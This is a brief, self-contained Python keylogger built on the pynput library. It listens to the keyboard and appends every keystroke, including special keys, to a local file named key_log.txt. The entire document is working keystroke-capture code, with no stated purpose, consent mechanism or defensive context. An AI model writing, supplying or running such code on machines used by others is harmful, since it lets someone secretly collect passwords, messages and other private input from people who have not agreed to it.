from pynput import keyboard

LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key.name}] ")

def main():
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    listener.join()

if __name__ == "__main__":
    main()
